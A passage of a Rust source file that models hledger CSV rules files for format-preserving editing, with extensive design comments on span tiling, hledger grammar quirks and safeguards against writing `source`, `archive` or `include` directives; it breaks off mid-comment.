//! The **CSV import rules file** model (`*.rules`) — a format-preserving,
//! span-tiling view of an hledger CSV rules file (Imports, steps 2-4).
//!
//! A rules file is a user's hand-maintained, hand-annotated artifact: comments
//! explaining why a matcher exists, values lined up in columns, a deliberate
//! blank line terminating a conditional table. Ledgeline's imports UI wants to
//! reorder, delete and edit those constructs *without* reformatting anything the
//! user did not ask it to touch. That rules out the obvious approach — parse
//! into a tree, re-render the tree — because re-rendering destroys every byte
//! the model does not represent.
//!
//! # The invariant that is the whole point
//!
//! **Item spans PARTITION the text.** `items[0].span.start == 0`, every item's
//! `span.end` is the next item's `span.start`, and the last item's `span.end` is
//! `text.len()`. There are no gaps and no overlaps, so the document *is* the
//! concatenation of its items' source text.
//!
//! Three safety properties fall out by construction rather than by care:
//! - **Round trip.** Serializing an unedited document is byte-identical, because
//!   it is a concatenation of every byte in order.
//! - **Reorder.** A reorder is a permutation of the parts of a partition, so it
//!   cannot lose, duplicate, or mangle a byte.
//! - **Delete.** Deleting is removing a part; everything else is untouched.
//!
//! [`RulesDoc::parse`] asserts the invariant in a debug assertion, and the unit
//! and integration suites assert it over every input they parse.
//!
//! # Why `String` + `Range<usize>` and not `ropey`
//!
//! [`crate::edit`] uses a rope because journals are large and edited in place.
//! Rules files are 2-8 KB and are rewritten wholesale, so a rope buys nothing —
//! and it costs the char-vs-byte index hazard that `edit.rs` documents as DL-1,
//! where ropey's Unicode line definition silently disagreed with the parser's
//! LF-only one and edits addressed the wrong lines. Byte offsets into a `String`
//! have one meaning. Every span here lands on a line boundary, which is always a
//! char boundary, so `&text[span]` can never split a code point.
//!
//! # Errors versus diagnostics
//!
//! [`RulesDoc::parse`] is **infallible**. A rules file always opens, even a
//! broken one — showing the user what is in the file is the entire point of the
//! screen. Anything unrecognized becomes an [`ItemKind::Opaque`] item, and
//! anything hledger would reject adds a [`Warning`]. This mirrors `parse.rs`'s
//! doctrine (see its module docs): an error means the input *cannot be read*, and
//! a rules file can always be read as "some lines".
//!
//! Step 3 layers **classification** on top of that: an item's [`ItemKind`] now
//! names what the construct *is*. Classification is purely additive — it reads
//! the same bytes and sets `kind`, and it never moves a `span` or a `body`. The
//! round-trip, reorder and delete proofs above are therefore untouched by it,
//! which is the property that let classification land after the safety
//! foundation rather than before it.
//!
//! # Item extents, and why they are exactly these
//!
//! An [`Item`] is a *paragraph*: an optional leading comment run, a body, and an
//! optional trailing blank run, which together tile the file.
//!
//! - **Leading run** — the contiguous comment lines immediately above the body
//!   with no blank line between. A comment directly above a block travels with
//!   it, because that is how rules files are annotated; moving the block without
//!   its comment would strand the explanation on an unrelated construct. A blank
//!   line is never absorbed upward, so a comment separated from the block below
//!   it stays its own [`ItemKind::Trivia`] item.
//! - **Trailing run** — the contiguous blank lines immediately below the body.
//!   This is load-bearing, not cosmetic: a conditional *table*'s extent is
//!   terminated by a blank line, so a table that shed its blank line and was then
//!   moved next to another table would swallow it.
//! - Comment and/or blank runs with no body to attach to become their own
//!   [`ItemKind::Trivia`] item.
//!
//! Body extents follow hledger 1.52's `RulesReader.hs` grammar. Three of its
//! facts are counter-intuitive and are the reason this is written out rather
//! than eyeballed:
//!
//! - A matcher line must begin at **column 1 with a non-space character**
//!   (hledger's `regexp` parser opens with `nonspace`), so an indented line ends
//!   the matcher run and begins the assignment run.
//! - A `#` or `;` line **between matchers is a regex to hledger, not a comment**.
//!   Inside a conditional block's matcher run this module therefore does not
//!   treat `#`/`;` lines as comments.
//! - An assignment line must be **indented** (`skipNonNewlineSpaces1`). An
//!   indented whitespace-only line is consumed by the block as a no-op, but a
//!   *truly empty* line ends it. "Blank" and "empty" are different questions here
//!   and are asked with different predicates.
//!
//! | Construct | Detected by | Body extent |
//! | --- | --- | --- |
//! | `if` table | `if` then a char that is neither alphanumeric nor whitespace (`if,`, `if\|`) | header, then every line up to the first *empty* line or EOF |
//! | `if` block | `if` alone, or `if` then whitespace | header, then the matcher run (column-1 non-space lines), then the assignment run (`^[ \t]` lines) |
//! | anything else | — | exactly one line |
//!
//! When an extent is uncertain the rule is to **widen**: swallowing the ambiguity
//! into one `Opaque` item keeps the ambiguous text moving as a unit, whereas
//! guessing narrow would let a move tear a construct in half.
//!
//! # Classification, and why so much stays opaque
//!
//! Where extents widen on doubt, classification **declines** on doubt. A typed
//! [`ItemKind`] is a promise that a later step may rewrite one part of the
//! construct and leave the rest alone; anything this module cannot make that
//! promise about stays [`ItemKind::Opaque`], byte-preserved, with an
//! [`OpaqueReason`] naming what stopped it. Opaque is never a failure — it is
//! the honest answer, and the file still round-trips either way.
//!
//! Every typed leaf carries the spans of its own *parts*: a [`Directive`]'s
//! keyword and value, an [`Assignment`]'s field, separator and value. That is
//! what lets step 4 splice one leaf and leave a column-aligned file aligned —
//! the separator is re-emitted verbatim, so there is no alignment code anywhere.
//!
//! An `if` **block** becomes the editable [`ItemKind::IfBlock`] only if all of
//! the following hold. Each rule is there because breaking it would let an edit
//! change a meaning the user did not ask to change:
//!
//! 1. It is a block, not a table ([`OpaqueReason::IfTable`]).
//! 2. Every matcher is plain or a **plain line-prefix `&` AND-continuation** —
//!    no `!`, `& !` or `&& !` prefix, no `&&` at the head of a line, and no `&&`
//!    joining two matchers on one line ([`OpaqueReason::CombinedMatcher`]).
//!    An editable block's matchers are an OR of AND-groups
//!    ([`MatcherGroup`]) — hledger's own `if A` / `& B` shape, verified against
//!    the 1.52 binary — so grouping is *structural* and an edit to one matcher
//!    cannot change what another means. A `!` negation is refused because
//!    hledger's `!` binds to its own line rather than to a group, so deleting
//!    or reordering around one silently re-points the rest.
//!
//!    The **first** matcher line may not begin with `&`: hledger 1.52 accepts
//!    one and treats it as a no-op, but it AND-s with nothing, and this module
//!    will not promise an edit preserves a form that means nothing.
//! 3. No matcher pattern contains an **unescaped `(`**
//!    ([`OpaqueReason::MatchGroup`]). No group means no `\N` backreference can
//!    be meaningful, so no assignment value can silently depend on a matcher.
//! 4. No matcher pattern begins with `;`, `#` or `*`
//!    ([`OpaqueReason::CommentLikeMatcher`]). hledger reads such a line as a
//!    **regex, not a comment**; making it editable would cement a misreading the
//!    author almost certainly did not intend.
//! 5. Every body line is whitespace-only or a well-formed indented assignment
//!    ([`OpaqueReason::UnparsedBlockBody`]). An indented `; comment` lands here:
//!    hledger 1.52 rejects the whole file for one, verified against the binary.
//! 6. No body assignment is `skip` or `end`
//!    ([`OpaqueReason::ControlFlowInBlock`]). Those two do not assign a value;
//!    they change which records are read at all.
//! 7. There is at least one matcher and at least one assignment
//!    ([`OpaqueReason::Unclassified`]), which is also all hledger accepts.
//!
//! Rules are checked in that order, so the reason names the *first* thing that
//! stopped the block, not an arbitrary one.
//!
//! # Editing: leaf splicing, not pretty-printing
//!
//! Step 4 adds [`Slot::Replace`] and [`Slot::Insert`]. The contract is narrow on
//! purpose: **editing item 3 rewrites bytes only inside item 3's `body` span,
//! and inside that span only the leaves that actually changed.** Items 1, 2 and
//! 4 — and item 3's own leading comment run and trailing blank run — come out as
//! the identical `&str` slices they went in as.
//!
//! That is why every typed leaf carries the spans of its own parts.
//! [`RulesDoc::apply`] re-emits an unchanged leaf's original bytes and re-renders
//! only a changed one, so a column-aligned file stays aligned because the
//! separator whitespace between the field and the value is *reused verbatim*.
//! There is deliberately **no alignment logic anywhere in this module**: none is
//! needed, and any would have to re-pad the neighbouring lines this module
//! contractually does not touch. A field rename therefore shifts its own line's
//! column and leaves its neighbours where they are — the honest result, and the
//! only one that keeps the promise above.
//!
//! Four consequences follow, and each has bitten a format-preserving editor
//! before:
//!
//! - **A rendered body always ends with the *detected* terminator**
//!   ([`RulesDoc::newline`]), so a CRLF file stays CRLF.
//! - **A file whose last line has no terminator is the case that bites.** An
//!   item that lacked a terminator and *stops being last* has one supplied,
//!   because otherwise it would be glued onto the item that follows it — a
//!   reorder that loses no byte and changes the meaning of two constructs.
//!   [`RulesDoc::verify`] catches that, so without this the renderer would make
//!   `verify` refuse correct reorders.
//! - **A construct whose extent needs a blank line to end gets one when it stops
//!   being last**, for the same reason and by the same rule. A conditional table
//!   runs to the first *empty* line or to EOF, so a table that ended the file
//!   carries no terminator at all, and anything placed after it re-parses as
//!   further data rows of that table. The renderer supplies the blank line
//!   rather than trusting the bytes. The two rules compose — an EOF table that
//!   gains a neighbour needs a line terminator *and* a blank line — and neither
//!   double-emits, because each asks whether the terminator it supplies is
//!   already there. Which constructs are terminator-sensitive is stated once, in
//!   [`Shape::ends_at_a_blank_line`], so a future one joins the list in a single
//!   place rather than as another special case in the renderer.
//! - **An inserted conditional block gets one trailing blank line**, and nothing
//!   else gets one. That is the near-universal convention, and it is *required*
//!   when the neighbour below is a conditional table, whose extent is terminated
//!   by a blank line and which would otherwise swallow the new block's lines.
//!
//! # What an edit may say, and what it may not
//!
//! [`ItemBody`] is the whole vocabulary of an edit, and **no variant of it
//! carries raw text**. Every byte [`RulesDoc::apply`] writes is either a byte
//! read from the file moments earlier or the output of a renderer in this module
//! over validated typed fields. That is a structural guarantee rather than a
//! promise, and it is what stops a client from smuggling arbitrary lines into a
//! rules file.
//!
//! On top of it sit two enforced layers, both in [`RulesDoc::apply`]:
//!
//! 1. The **edit policy** ([`replaceable`] / [`writable`]) — `source`, `archive`
//!    and `include` may only ever be *kept*. That is a security requirement, not
//!    taste; [`writable`] explains the remote-code-execution primitive it
//!    closes.
//! 2. **Value validation** ([`check_body`]) — every client-supplied string is
//!    checked before it reaches a renderer. A newline is how one would smuggle a
//!    second rule into a one-line item, so control characters are refused
//!    outright; the rest of the checks reject only the shapes that break
//!    hledger's *grammar*, and leave regex validity to hledger, which owns a
//!    regex engine (this module does not).
//!
//! # Deliberate divergences from hledger, and findings
//!
//! Verified against the hledger 1.52 binary while writing this (the fixture
//! corpus is checked against the same binary by `just rules-check`):
//!
//! - **A directive's value is not trimmed, but a matcher's pattern is.**
//!   `date-format %Y-%m-%d ` really does carry the trailing space into the
//!   format string and really does fail to parse dates, so a value span here
//!   runs verbatim to end of line. hledger's `regexp` ends in `T.strip`, so
//!   matcher pattern spans are trimmed. The asymmetry is hledger's, not ours.
//! - **`separator`, `skip`, `decimal-mark` and `balance-type` read a token, not
//!   the raw value.** hledger tolerates surrounding whitespace on those; the
//!   token is taken from the trimmed value while the span stays verbatim.
//! - **A `fields` list may not be followed by whitespace.** hledger's
//!   `fieldnamelistp` commits after `skipNonNewlineSpaces`, so
//!   `fields a, b  ; note` is a hard parse error — the trailing text is *not*
//!   discarded as its docs' `restofline` suggests. Only text abutting the last
//!   name (`fields a, b;note`) is discarded. The tail is captured as its own
//!   span either way, because dropping it on an edit would be data loss, and the
//!   whitespace-led form raises a [`Warning`].
//! - **`&&` anywhere in a matcher makes the block opaque**, even inside what is
//!   plainly one regex, and even as a line prefix — where hledger 1.52 really
//!   does read it as an AND join, verified against the binary. Distinguishing
//!   "joins two matchers" from "is two ampersands" needs hledger's own parser;
//!   declining costs only editability. A **single** leading `&` carries no such
//!   ambiguity and is the [`MatcherGroup`] shape rule 2 admits.
//! - **A first matcher line beginning `&` makes the block opaque**, although
//!   hledger accepts it: `if\n& COFFEE` really does import exactly what
//!   `if\nCOFFEE` does, so the `&` is a no-op with nothing to AND with.
//! - **`&` is a prefix only at the start of a matcher line.** `%description
//!   &COFFEE` is a regex matching a literal ampersand and matches no record
//!   containing plain `COFFEE`, verified against the binary — so a `&` after a
//!   `%FIELD` is content, never a combinator.
//! - **Quoted `fields` names are out of scope.** hledger accepts
//!   `fields date, "my field"`; a name starting with `"` leaves the line
//!   [`OpaqueReason::Unclassified`] rather than reporting a name list this
//!   module would have to guess at.
//! - **`source` is recorded verbatim and never resolved, globbed or executed.**
//!   [`DirectiveValue::Source`] flags a `|` because that is a shell command
//!   hledger runs on `import`; nothing here acts on it.

/// Step 5: which `*.rules` files the imports feature may look at, and therefore
/// which ones a later write path may overwrite. Step 6 adds the CSV column
/// preview — reading the first few rows of the data file a rules file describes.
///
/// A separate module rather than more of this file, for one concrete reason:
/// [`DiscoveredRules::path`] and [`Discovery::root`] are private *to it*, so
/// nothing in `rules.rs` — including a future edit to `rules.rs` — can mint a
/// [`RulesPath`] that no scan produced. "You may only write to a file discovery
/// returned" is then a fact about the type system rather than a rule reviewers
/// have to remember. The preview inherits that: it can only reach a data file by
/// starting from a [`DiscoveredRules`], so it is confined to the same root
/// without a second containment argument.
mod discovery;
pub mod matching;

pub use discovery::{DiscoveredRules, Discovery, Preview, PreviewUnavailable, RulesPath, discover};

use itertools::Itertools;
use std::collections::{BTreeSet, HashMap};
use std::ops::Range;
use thiserror::Error;

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

/// Errors produced while planning or checking a rules-file rewrite.
///
/// Parsing is not among them — see [`RulesDoc::parse`]. Unlike
/// [`crate::edit::EditError`] this carries no [`std::io::Error`], so it can be
/// `Clone`/`PartialEq` and compared directly in tests.
#[derive(Debug, Error, Clone, PartialEq, Eq)]
pub enum RulesError {
    /// An [`EditPlan`] named an item that does not exist in this document —
    /// almost always a stale id from a client that edited against an older
    /// parse.
    #[error("unknown item id {0}")]
    UnknownItem(u32),
    /// An [`EditPlan`] named the same item twice (in `order`, in `delete`, or in
    /// both). Honouring it would duplicate the item's bytes.
    #[error("item id {0} appears more than once")]
    DuplicateItem(u32),
    /// An [`EditPlan`] left items unaccounted for. Omission is never an implicit
    /// delete: a client bug that drops half its array must not silently truncate
    /// the user's rules file.
    #[error(
        "the document must list every item; missing: {0}. List them in \"delete\" to remove them on purpose."
    )]
    MissingItems(String),
    /// [`RulesDoc::verify`] could not prove the rewritten text is the requested
    /// edit and nothing else, so the caller must write nothing. The analogue of
    /// [`crate::edit::EditError::RoundTripMismatch`].
    ///
    /// This is **ours, not the caller's**: it means the text handed to `verify`
    /// is not what the plan renders, or that the re-parse does not tile. A caller
    /// that verifies [`RulesDoc::apply`]'s own output — which is the only
    /// supported way to use the pair — can reach it solely through a bug in this
    /// module. The caller-caused half of the old check is
    /// [`RulesError::WouldMergeConstructs`].
    #[error("the rewritten rules file failed its round-trip check; nothing was written")]
    RoundTripMismatch,
    /// The plan's own arrangement would change what the file means: at the
    /// position asked for, a construct and its neighbour re-parse as **one**
    /// construct rather than two.
    ///
    /// The renderer supplies the terminators it can — a missing final newline,
    /// and the blank line a conditional table's extent needs (see the module
    /// docs) — so this is what is left: a construct whose extent is ended by the
    /// *kind* of the line after it, where no terminator exists to supply. A bare
    /// `if` with no assignments swallows any column-1 line moved beneath it,
    /// because hledger reads that line as another matcher; an indented top-level
    /// line moved below a conditional block joins that block's body.
    ///
    /// Nothing is written, and the fix is the caller's: put the item somewhere
    /// else, or separate the two constructs. Carrying the position of the
    /// offending slot (**1-based, in the order the plan listed**) lets a client
    /// point at the row rather than re-derive it.
    #[error(
        "item {0} of this save would not be read back as a rule of its own: with nothing separating them, it and the item beside it read as a single construct. Move it elsewhere, or put a blank line between the two by editing the file in a text editor. Nothing was written."
    )]
    WouldMergeConstructs(u32),
    /// A [`Slot::Replace`] or [`Slot::Insert`] asked for content the **edit
    /// policy** refuses. See [`replaceable`] for the table and [`writable`] for
    /// why `source` and `archive` are on it.
    ///
    /// `why` already names the item, so a caller can surface it unchanged; `id`
    /// is there for a client that wants to highlight the row.
    #[error("{why}")]
    NotEditable {
        /// The item a `Replace` named, or `None` for an `Insert`, which has no
        /// item to name yet.
        id: Option<ItemId>,
        /// Which rule refused, phrased for the person editing the file.
        why: String,
    },
    /// A client-supplied string is not something this module will write into a
    /// rules file — see [`check_body`]. Checked *before* any renderer sees it,
    /// so a rejected value never reaches the output.
    #[error("{0}")]
    Invalid(String),
    /// The document opens with a byte-order mark and the plan does not open with
    /// the item that carries it.
    ///
    /// A BOM lives at offset 0 and nowhere else. Reordering the item that owns
    /// it would move a zero-width, invisible character into the middle of the
    /// file — where hledger reads it as part of a rule and rejects the line —
    /// while simultaneously stripping it from the front, silently changing how
    /// every other tool identifies the file's encoding. Neither half of that is
    /// something a user asked for by dragging a row, so the plan is refused
    /// rather than half-honoured.
    #[error(
        "the first item carries the file's byte-order mark and must stay first; moving it would bury an invisible character mid-file"
    )]
    BomMustLeadDocument,
}

impl RulesError {
    /// A [`RulesError::NotEditable`] whose message names its subject, so the
    /// `why` a policy function returns never has to repeat the id plumbing.
    fn not_editable(id: Option<ItemId>, why: &str) -> Self {
        let subject = match id {
            Some(id) => format!("item {id}"),
            None => "a new item".to_string(),
        };
        Self::NotEditable {
            id,
            why: format!("{subject} {why}"),
        }
    }
}

// ---------------------------------------------------------------------------
// Core types
// ---------------------------------------------------------------------------

/// A byte range into [`RulesDoc::text`].
///
/// Byte offsets, not char offsets: every span produced here starts and ends on a
/// line boundary, which is necessarily a char boundary, so `&text[span]` can
/// never split a code point. See the module docs for why this is not `ropey`.
pub type Span = Range<usize>;

/// An item's identity: its **0-based position in [`RulesDoc::items`] at parse
/// time**.
///
/// Deliberately *not* stable across saves. A rules file has no natural key for a
/// construct — two identical `account2 expenses:unknown` lines are
/// indistinguishable — so inventing a durable id would be inventing a lie. The
/// contract is instead that a client parses, plans, and applies against one
/// document version; [`RulesDoc::apply`] rejects ids it does not recognize.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct ItemId(pub u32);

impl std::fmt::Display for ItemId {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

/// The line terminator a document uses, **detected from the text and never
/// imposed**.
///
/// Rewriting a CRLF file with LF terminators would show every line as changed in
/// the user's diff and, on Windows, in their editor. Nothing in this step
/// synthesizes text, but the detection belongs with the parse that observed it —
/// by the time a later step needs to emit a line, the original bytes may be gone.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Newline {
    /// `\n` — the default, and what is assumed when a file has no terminator at
    /// all (a single line with no trailing newline, or an empty file).
    Lf,
    /// `\r\n`.
    CrLf,
}

impl Newline {
    /// The terminator's bytes, for synthesizing new lines.
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Lf => "\n",
            Self::CrLf => "\r\n",
        }
    }

    /// `CrLf` if the **first** line terminator in `text` is `\r\n`, else `Lf`.
    ///
    /// Only the first is consulted: a mixed file has no single right answer, and
    /// picking the majority would make the choice depend on content that a later
    /// edit can change.
    pub(crate) fn detect(text: &str) -> Self {
        match text.find('\n') {
            Some(index) if text[..index].ends_with('\r') => Self::CrLf,
            _ => Self::Lf,
        }
    }
}

// ---------------------------------------------------------------------------
// Typed constructs
// ---------------------------------------------------------------------------

/// One of hledger's eleven rules-file directives, with the spans of its parts.
///
/// `name_span` covers the keyword only, never the optional trailing `:` — the
/// colon is punctuation the user chose, and a rename must not silently drop or
/// add it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Directive {
    /// Which directive this is.
    pub name: DirectiveName,
    /// The keyword as written, without any trailing `:`.
    pub name_span: Span,
    /// Everything after the separator, **verbatim to end of line**, exactly as
    /// hledger's `directivevalp` reads it — trailing whitespace included,
    /// because for `date-format` and friends it really is part of the value.
    /// Empty for a flag, or for a directive written with no value at all.
    pub value_span: Span,
    /// The value, interpreted. For the token-shaped directives this is read from
    /// the *trimmed* `value_span` text, because hledger tolerates surrounding
    /// whitespace there.
    pub value: DirectiveValue,
}

/// The eleven directive keywords hledger accepts in a rules file.
///
/// Each accepts an optional trailing `:`, so `separator:,` and `separator ,`
/// are the same directive.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum DirectiveName {
    /// `source` — where `hledger import` reads the CSV from.
    Source,
    /// `archive` — move the CSV aside after a successful import.
    Archive,
    /// `encoding` — the CSV's character encoding.
    Encoding,
    /// `separator` — the CSV's field separator.
    Separator,
    /// `decimal-mark` — `.` or `,`, disambiguating amounts.
    DecimalMark,
    /// `date-format` — a strptime-style format for the `date` field.
    DateFormat,
    /// `timezone` — the zone datetimes in the CSV are written in.
    Timezone,
    /// `newest-first` — the CSV is in reverse chronological order.
    NewestFirst,
    /// `intra-day-reversed` — same-day records are in reverse order.
    IntraDayReversed,
    /// `skip` — how many leading records (usually header rows) to ignore.
    Skip,
    /// `balance-type` — which assertion form generated balances use.
    BalanceType,
}

/// A directive's value, interpreted just far enough to render a form control.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DirectiveValue {
    /// `source` — kept **verbatim** and never resolved, globbed or executed.
    Source {
        /// The value exactly as written.
        raw: String,
        /// The value contains a `|`, which makes it a **shell command** hledger
        /// runs on `import`. Surfaced so a UI can refuse to treat it as a path
        /// and can warn before anything runs it.
        has_command: bool,
    },
    /// A directive that takes no value: `archive`, `newest-first`,
    /// `intra-day-reversed`. Its presence is the whole meaning. (hledger ignores
    /// any text after these, and so does this.)
    Flag,
    /// Free text hledger does not constrain at parse time: `encoding`,
    /// `date-format`, `timezone`. Equal to the `value_span` text, byte for byte.
    Text(String),
    /// A `separator` value.
    Separator(Separator),
    /// A `decimal-mark` value: `.` or `,`.
    DecimalMark(char),
    /// A `skip` count. A bare `skip` means 1, which is what hledger does.
    Skip(u32),
    /// A `balance-type` value.
    BalanceType(BalanceType),
}

/// A CSV field separator.
///
/// `Tab` and `Space` keep the token **as written** because hledger matches those
/// two words case-insensitively: re-emitting a normalized `tab` for a user's
/// `TAB` would be this module rewriting a byte nobody asked it to touch.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Separator {
    /// Any single character, e.g. `,` or `;` or `|`.
    Char(char),
    /// The word `tab`, in whatever case it was written.
    Tab {
        /// The token as written.
        raw: String,
    },
    /// The word `space`, in whatever case it was written.
    Space {
        /// The token as written.
        raw: String,
    },
}

/// Which balance-assertion form a generated balance uses.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum BalanceType {
    /// `=` — a single-commodity, exclusive-of-subaccounts assertion.
    Simple,
    /// `=*` — inclusive of subaccounts.
    Inclusive,
    /// `==` — a total (all-commodities) assertion.
    Total,
    /// `==*` — a total assertion, inclusive of subaccounts.
    TotalInclusive,
}

/// An `include RULESFILE` line.
///
/// Typed for **display only**. The target is kept exactly as written and this
/// module never opens, resolves or globs it — reading a path out of a user's
/// file is not the same as being asked to follow it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Include {
    /// The target as written, verbatim to end of line.
    pub target: String,
    /// Where `target` sits in the document.
    pub target_span: Span,
}

/// A `fields` list: the CSV's column names, in column order.
///
/// The separator here is **always a comma**, unrelated to the CSV's own
/// `separator` directive — a `separator ;` file still writes `fields a, b`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Fields {
    /// The names **as written**. Not lowercased: hledger lowercases them for its
    /// own lookups, but that is its semantic view, not the file's text, and
    /// writing back a lowercased name would be an edit nobody requested. A name
    /// may be empty — `fields date,, amount` is legal and means "ignore column
    /// 2".
    pub names: Vec<String>,
    /// One span per entry of `names`, same order. Empty names get empty spans.
    pub name_spans: Vec<Span>,
    /// Everything after the last name, to end of line. Usually empty.
    ///
    /// Captured rather than dropped because an edit that re-rendered the list
    /// without it would be data loss. hledger discards this text when it abuts
    /// the last name (`fields a, b;note`) and **rejects the file** when
    /// whitespace precedes it (`fields a, b ; note`) — the latter raises a
    /// [`Warning`].
    pub tail_span: Span,
}

/// A field assignment: `HLEDGERFIELD` then a separator then a value.
///
/// The value runs **verbatim to end of line**. hledger does no comment stripping
/// here (its `fieldvalp` is `anySingle manyTill eolof`), so a `;` in that text is
/// part of the value, not the start of a comment.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Assignment {
    /// Which hledger field is being assigned.
    pub field: HledgerField,
    /// The field name as written.
    pub field_span: Span,
    /// The literal whitespace (or `:` + whitespace) between field and value.
    /// Re-emitted verbatim on a value-only edit — which is the entire reason a
    /// column-aligned rules file stays aligned with no alignment code anywhere.
    pub sep_span: Span,
    /// The value, verbatim to end of line. Empty when the line is a bare field
    /// name, which hledger reads as assigning the empty string.
    pub value_span: Span,
}

/// An hledger CSV rules field name.
///
/// Names are matched **longest-first**, so `account10` is `{Account, 10}` and
/// never `account1` followed by a stray `0`. This module gets that for free by
/// reading the whole name-shaped run and then looking it up: `account100` is not
/// a name, and hledger rejects it too (verified — it fails with "unexpected
/// '0'", because its separator parser has nowhere to go).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum HledgerField {
    /// `date`.
    Date,
    /// `date2` — the secondary date.
    Date2,
    /// `status`.
    Status,
    /// `code`.
    Code,
    /// `description`.
    Description,
    /// `comment` — the transaction comment.
    Comment,
    /// `amount`.
    Amount,
    /// `amount-in`.
    AmountIn,
    /// `amount-out`.
    AmountOut,
    /// `currency`.
    Currency,
    /// `balance`.
    Balance,
    /// A posting-numbered field, `1..=99`, e.g. `account2` or `amount1-in`.
    Numbered {
        /// Which family the name belongs to.
        base: NumberedField,
        /// The posting number, `1..=99`. `account01` is **not** this: hledger's
        /// name list spells the number without leading zeros, so `account01` is
        /// not a field name at all.
        n: u8,
    },
    /// `skip` or `end` — not an assignment at all, but recognized so a block
    /// containing one can be named [`OpaqueReason::ControlFlowInBlock`] instead
    /// of being mistaken for an unparsable body.
    Control(ControlField),
}

/// The families of hledger field name that take a posting number.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum NumberedField {
    /// `accountN`.
    Account,
    /// `amountN`.
    Amount,
    /// `amountN-in`.
    AmountIn,
    /// `amountN-out`.
    AmountOut,
    /// `commentN`.
    Comment,
    /// `currencyN`.
    Currency,
    /// `balanceN`.
    Balance,
}

/// hledger's two control words, which read like assignments but are not.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ControlField {
    /// `skip` — skip the next N records.
    Skip,
    /// `end` — stop reading records entirely.
    End,
}

/// A conditional block this module is willing to let a later step edit.
///
/// A block that fails any of the module docs' seven rules is **not** this — it
/// stays [`ItemKind::Opaque`] with the reason that stopped it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct IfBlock {
    /// Whether the first matcher sits on the `if` line or below it.
    pub layout: IfLayout,
    /// The OR-ed matcher groups, in file order. At least one, each non-empty.
    ///
    /// A block with no `&` continuation lines — every rules file this module
    /// could already edit — is one group per matcher, so an OR list is the
    /// degenerate case of this rather than a separate shape.
    pub groups: Vec<MatcherGroup>,
    /// The indented assignments, in file order.
    pub assignments: Vec<Assignment>,
    /// The exact leading whitespace of the block's first body line, reused
    /// verbatim for any assignment step 4 adds. Never normalized.
    ///
    /// "First body line" means the first line that carries an assignment: a
    /// whitespace-only line's entire content is its indentation, so aligning to
    /// one would align to nothing.
    pub indent: Span,
}

/// One OR-branch of a conditional block: matchers AND-ed together.
///
/// hledger spells the AND with a **line-prefix `&`**: the group's first matcher
/// is a plain line (or the `if` header's own matcher) and every further matcher
/// in the same group is a line beginning `&`. Groups are OR-ed, in file order.
/// Verified against hledger 1.52 — `if\nA\n& B\nC\n& D` selects a record
/// matching `(A and B) or (C and D)`.
///
/// The `&` itself is grammar rather than content, so it appears nowhere in a
/// [`Matcher`]: a group's *shape* is what says AND, and the renderer is what
/// puts the `&` back.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MatcherGroup {
    /// The AND-ed matchers, in file order. Never empty.
    pub matchers: Vec<Matcher>,
}

/// Where a conditional block's first matcher lives.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum IfLayout {
    /// `if MATCHER` — the first matcher is on the header line. Further matchers
    /// may still follow on their own lines.
    Inline,
    /// A bare `if`, with every matcher on its own following line.
    Stacked,
}

/// One matcher inside a conditional block.
///
/// `pattern_span` is **trimmed** at both ends, because hledger's `regexp` ends in
/// `T.strip` — a matcher's trailing spaces are not part of the regex, unlike a
/// directive's or an assignment's trailing spaces, which are part of the value.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Matcher {
    /// What the pattern is matched against.
    pub scope: MatchScope,
    /// The regex as hledger reads it. Never compiled here — this module shows
    /// and moves patterns, it does not run them.
    pub pattern: String,
    /// Where `pattern` sits in the document.
    pub pattern_span: Span,
    /// For a field-scoped matcher, where the name sits — **excluding** the `%`,
    /// which is punctuation rather than part of the name, so a rename splices
    /// only the name. `None` for a whole-record matcher.
    pub field_span: Option<Span>,
}

/// What a [`Matcher`] matches against.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum MatchScope {
    /// A bare regex, matched against the whole CSV record.
    WholeRecord,
    /// `%NAME` or `%3` — matched against one field. The string excludes the `%`.
    ///
    /// A `%`-led matcher that is not a valid field reference (`%description`
    /// with no pattern after it, say) is **not** this: hledger's
    /// `try fieldmatcherp <|> recordmatcherp` falls back to reading the whole
    /// thing as a whole-record regex, and so does this.
    Field(String),
}

/// Why an item could not be classified — the *first* rule that stopped it.
///
/// Every variant is a decision not to promise that an edit to part of this
/// construct would leave the rest meaning what it meant. See the module docs for
/// the rule list and the reasoning behind each one.
/// `Ord` so a caller can collect reasons into a sorted set and report them in a
/// stable order; the ordering itself carries no meaning.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum OpaqueReason {
    /// A conditional table (`if,` / `if|` …), terminated by an empty line or EOF.
    /// Tables are never editable here: a row's meaning is positional, so an edit
    /// to the header silently re-points every row.
    IfTable,
    /// A matcher carries a `!`, `& !`, `&&` or `&& !` prefix, joins two matchers
    /// on one line with `&&`, or is a first matcher line beginning with `&`.
    ///
    /// A plain line-prefix `&` chain is **not** this — it is the editable
    /// [`MatcherGroup`] shape. What is left here is the two things this module
    /// declines to model: negation, whose scope is a line rather than a group, so
    /// a reorder or delete around one changes what its neighbours select; and
    /// `&&`, which cannot be told from two literal ampersands in one regex
    /// without hledger's own parser.
    ///
    /// A bare `!` (negation with nothing to combine) lands here too: the reason
